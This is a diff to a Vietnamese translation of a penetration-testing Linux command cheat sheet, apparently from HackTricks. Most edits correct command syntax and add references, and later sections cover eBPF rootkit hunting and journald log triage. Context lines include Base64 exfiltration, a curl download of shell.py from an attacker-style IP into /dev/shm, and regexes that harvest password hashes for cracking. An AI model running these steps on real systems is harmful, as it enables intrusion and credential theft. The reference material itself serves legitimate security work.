@@ -4,6 +4,8 @@
 
 ## Bash phổ biến
 
+`lsof -i4` và `lsof -i6` chọn một họ IP.<sup>[[8]](#references)</sup> `7z x` giải nén một kho lưu trữ và giữ nguyên cấu trúc thư mục.<sup>[[9]](#references)</sup> `wc -c` đếm byte, không phải ký tự.<sup>[[13]](#references)</sup> Ví dụ về tài khoản sử dụng `passwd` theo cách tương tác: `useradd -p` yêu cầu một giá trị hash crypt được tính trước, không phải một lệnh shell, và làm lộ đối số này trong danh sách tiến trình.<sup>[[10]](#references)</sup>
+
 ```bash
 #Exfiltration using Base64
 base64 -w 0 file
@@ -19,7 +21,7 @@ echo -n -e
 
 #Count
 wc -l <file> #Lines
-wc -c #Chars
+wc -c #Bytes
 
 #Sort
 sort -nr #Sort by number and then reverse
@@ -37,9 +39,9 @@ curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 lsof #Open files belonging to any process
 lsof -p 3 #Open files used by the process
 lsof -i #Files used by networks processes
-lsof -i 4 #Files used by network IPv4 processes
-lsof -i 6 #Files used by network IPv6 processes
-lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
+lsof -i4 #Files used by network IPv4 processes
+lsof -i6 #Files used by network IPv6 processes
+lsof -i4 -a -p 1234 #List all open IPv4 network files in use by process 1234
 lsof +D /lib #Processes using files inside the indicated dir
 lsof -i :80 #Files uses by networks processes
 fuser -nv tcp 80
@@ -59,11 +61,12 @@ bzip2 -d /path/to/yourfile.bz2
 tar jxf file.tar.bz2
 gunzip /path/to/yourfile.gz
 unzip file.zip
-7z -x file.7z
+7z x file.7z
 sudo apt-get install xz-utils; unxz file.xz
 
 #Add new user
-useradd -p 'openssl passwd -1 <Password>' hacker
+sudo useradd -m hacker
+sudo passwd hacker
 
 #Clipboard
 xclip -sel c < cat file.txt
@@ -131,7 +134,7 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 7z l file.zip
 ```
 
-## Bash cho Windows
+## Bash trên Windows
 
 ```bash
 #Base64 for Windows
@@ -153,7 +156,9 @@ python pyinstaller.py --onefile exploit.py
 i686-mingw32msvc-gcc -o executable useradd.c
 ```
 
-## Greps
+## Các lệnh grep
+
+Dùng `grep -E` cho biểu thức chính quy mở rộng, chẳng hạn bộ định lượng `{n}`, và `grep -P` cho các look-around MD5. Hãy đặt dấu đô la của shell trong dấu nháy khi trích xuất password hash.<sup>[[11]](#references)</sup> Các biểu thức này tìm **ứng viên**, chứ không chứng minh loại hash; hãy so sánh kết quả với [quy trình nhận diện và bẻ khóa hash](../../crypto/hashes/#password-hashing-and-cracking) trước khi chọn chế độ bẻ khóa.<sup>[[12]](#references)</sup>
 
 ```bash
 #Extract emails from file
@@ -168,29 +173,23 @@ grep -i "pwd\|passw" file.txt
 #Extract users
 grep -i "user\|invalid\|authentication\|login" file.txt
 
-# Extract hashes
-#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
-egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
-#Extract valid MySQL-Old hashes
-grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
-#Extract blowfish hashes
-grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
-#Extract Joomla hashes
-egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
-#Extract VBulletin hashes
-egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
-#Extraxt phpBB3-MD5
-egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
-#Extract Wordpress-MD5
-egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
-#Extract Drupal 7
-egrep -o '$S$S{52}' *.txt > drupal-7.txt
-#Extract old Unix-md5
-egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
-#Extract md5-apr1
-egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
-#Extract sha512crypt, SHA512(Unix)
-egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt
+# Extract hash candidates from text (validate against the application format)
+# Raw MD5: 32 hex characters
+grep -Po '(?<![[:xdigit:]])[[:xdigit:]]{32}(?![[:xdigit:]])' *.txt > md5-hashes.txt
+# Legacy MySQL323: two 8-hex halves whose leading nibble is 0..7
+grep -Eo '[0-7][[:xdigit:]]{7}[0-7][[:xdigit:]]{7}' *.txt > mysql-old-hashes.txt
+# bcrypt ($2a$/$2b$/$2y$): 60 characters total
+grep -Eo '\$2[aby]\$[0-9]{2}\$[./A-Za-z0-9]{53}' *.txt > bcrypt-hashes.txt
+# Legacy MD5:salt pairs: identify the application before choosing a mode
+grep -Eo '[[:xdigit:]]{32}:[[:alnum:]]{3,32}' *.txt > md5-salt-candidates.txt
+# phpass ($H$ phpBB3; $P$ WordPress and other applications)
+grep -Eo '\$[PH]\$[./A-Za-z0-9]{31}' *.txt > phpass-hashes.txt
+# Drupal 7
+grep -Eo '\$S\$[./A-Za-z0-9]{52}' *.txt > drupal-7.txt
+# Unix md5crypt, Apache apr1, and sha512crypt (optional rounds field)
+grep -Eo '\$1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}' *.txt > md5crypt.txt
+grep -Eo '\$apr1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}' *.txt > apr1.txt
+grep -Eo '\$6\$(rounds=[0-9]+\$)?[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{86}' *.txt > sha512crypt.txt
 
 #Extract e-mails from text files
 grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt
@@ -315,9 +314,9 @@ iptables -P FORWARD ACCEPT
 iptables -P OUTPUT ACCEPT
 ```
 
-## Telemetry eBPF & săn tìm rootkit
+## eBPF Telemetry & Rootkit Hunting
 
-Nghiên cứu về rootkit đã ghi nhận các implant dựa trên eBPF như TripleCross và các backdoor dựa trên BPF như các biến thể BPFDoor. Hãy xem các chương trình, điểm gắn kết hoặc map BPF bất ngờ là manh mối cần điều tra, chứ không phải bằng chứng hệ thống đã bị xâm nhập.<sup>[[3]](#references)[[4]](#references)</sup> Hãy lập baseline cho các hệ thống được phép bằng `bpftool` hoặc `eBPFmon`: `bpftool` có thể liệt kê chương trình và map, xuất hướng dẫn của chương trình, cũng như truy vấn các tính năng được hỗ trợ; còn eBPFmon hiển thị thông tin đó trong giao diện TUI.<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>
+Nghiên cứu rootkit đã ghi nhận cả implant dựa trên eBPF như TripleCross và backdoor dựa trên BPF như các biến thể BPFDoor. Hãy xem các chương trình, attachment hoặc map BPF bất ngờ là manh mối cần điều tra, chứ không phải bằng chứng hệ thống đã bị xâm nhập.<sup>[[3]](#references)[[4]](#references)</sup> Thiết lập baseline cho các hệ thống được ủy quyền bằng `bpftool` hoặc `eBPFmon`: `bpftool` có thể liệt kê chương trình và map, dump lệnh của chương trình, cũng như truy vấn các tính năng được hỗ trợ; trong khi đó, eBPFmon hiển thị thông tin này trong TUI.<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>
 
 ```bash
 #Enumerate all eBPF programs, attach points, owning PIDs and map IDs
@@ -337,11 +336,11 @@ sudo bpftool feature probe | less
 sudo ebpfmon
 ```
 
-Đối chiếu đầu ra của `bpftool` với các attachment NIC/cgroup dự kiến; một chương trình `xdp` hoặc `kprobe` bất ngờ do PID chưa được phê duyệt sở hữu là đầu mối cần điều tra, không phải bằng chứng xác thực về payload bị chèn.<sup>[[5]](#references)[[6]](#references)</sup>
+Tương quan đầu ra của `bpftool` với các điểm gắn NIC/cgroup dự kiến; một chương trình `xdp` hoặc `kprobe` bất ngờ thuộc sở hữu của PID chưa được phê duyệt là manh mối cần điều tra, không phải bằng chứng kết luận về payload bị chèn.<sup>[[5]](#references)[[6]](#references)</sup>
 
 ## Phân loại sự cố Journald
 
-`journalctl` đọc các mục có cấu trúc từ `systemd-journald` và hỗ trợ lọc theo boot, mức độ ưu tiên, unit, UID và thời gian tương đối. Hãy kết hợp các bộ lọc đó với đầu ra JSON khi cần lưu giữ hoặc so sánh bằng chứng; chỉ lọc thôi không chứng minh được rằng log không bị sửa đổi.<sup>[[2]](#references)[[7]](#references)</sup>
+`journalctl` đọc các mục có cấu trúc từ `systemd-journald` và hỗ trợ lọc theo lần khởi động, mức độ ưu tiên, unit, UID và thời gian tương đối. Kết hợp các bộ lọc này với đầu ra JSON khi cần bảo toàn hoặc so sánh bằng chứng; chỉ lọc thôi không chứng minh được rằng nhật ký chưa bị giả mạo.<sup>[[2]](#references)[[7]](#references)</sup>
 
 ```bash
 journalctl --list-boots                                #Enumerate boot IDs with timestamps
@@ -354,7 +353,9 @@ sudo journalctl --vacuum-size=1G --vacuum-time=7days   #Trim only after taking e
 journalctl --no-pager --since="2025-06-01" --until="2025-06-10" > system_logs_2025-06-01_to_06-10.log
 ```
 
-Thêm `--grep 'Invalid user' --case-sensitive` hoặc `-k` (chỉ thông báo kernel) khi cần bộ lọc chặt hơn, và hãy nhớ có thể kết hợp các selector `_PID`, `_SYSTEMD_UNIT`, `_HOSTNAME` và `_TRANSPORT` để tìm kiếm có mục tiêu.<sup>[[7]](#references)</sup>
+Thêm `--grep 'Invalid user' --case-sensitive` hoặc `-k` (chỉ thông báo kernel) khi cần bộ lọc chặt hơn, và hãy nhớ có thể kết hợp các selector `_PID`, `_SYSTEMD_UNIT`, `_HOSTNAME` và `_TRANSPORT` để truy tìm có mục tiêu.<sup>[[7]](#references)</sup>
+
+
 
 ## References
 
@@ -364,5 +365,11 @@ Thêm `--grep 'Invalid user' --case-sensitive` hoặc `-k` (chỉ thông báo ke
 - [4] [Rapid7 Labs: BPFdoor trong các mạng viễn thông](https://www.rapid7.com/blog/post/tr-bpfdoor-telecom-networks-sleeper-cells-threat-research-report/)
 - [5] [Tài liệu BPF — Tài liệu Linux Kernel](https://docs.kernel.org/bpf/)
 - [6] [libbpf/bpftool](https://github.com/libbpf/bpftool)
-- [7] [journalctl(1) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man1/journalctl.1.html)
+- [7] [journalctl(1) — Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man1/journalctl.1.html)
+- [8] [lsof(8) — Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/lsof.8.html)
+- [9] [Lệnh x của 7-Zip](https://documentation.help/7-Zip-18.0/extract_full.htm)
+- [10] [useradd(8) — Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/useradd.8.html)
+- [11] [grep(1) — Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man1/grep.1.html)
+- [12] [Các hash mẫu của Hashcat](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-example-hashes.md)
+- [13] [wc(1) — Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man1/wc.1.html)
 {{#include ../../banners/hacktricks-training.md}}
